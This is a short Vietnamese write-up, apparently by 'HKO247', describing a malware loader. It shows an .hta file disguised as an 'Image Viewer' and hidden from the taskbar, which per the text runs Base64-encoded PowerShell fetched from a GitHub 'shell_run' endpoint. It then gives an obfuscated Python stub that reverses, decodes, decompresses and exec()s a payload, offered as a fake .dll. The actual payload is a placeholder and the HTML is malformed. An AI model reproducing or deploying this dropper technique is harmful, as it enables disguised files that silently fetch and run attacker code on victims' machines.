Code được giải mã bởi HKO247

Cách thức hoạt động:

1. Chương trình .hta mở Prossecess bằng Powsershell run đoạn Base64

<Dữ liệu trong *.hta>

<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
     <hta:application
      border="none"
      maximizeButton="no"
      minimizeButton="no"
      scroll="no"
      showInTaskbar="no"
      windowState="normal">
    </hta:application>
    <body>
<!--Convert Base64 tạo bacth với endpoint https://github.com/hkoblack/Vietnamese-Buffalo/blob/concudaden/shell_run -->      
</body>
</head>
</html>


  2. Navite .dll từ code 
    https://github.com/hkoblack/Vietnamese-Buffalo/blob/concudaden/decode_concudaden.py
    Hoặc tạo *.dll  có dữ liệu 
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
exec((_)(b'"Đoạn base64 convert từ python mình gửi ở trên"'))
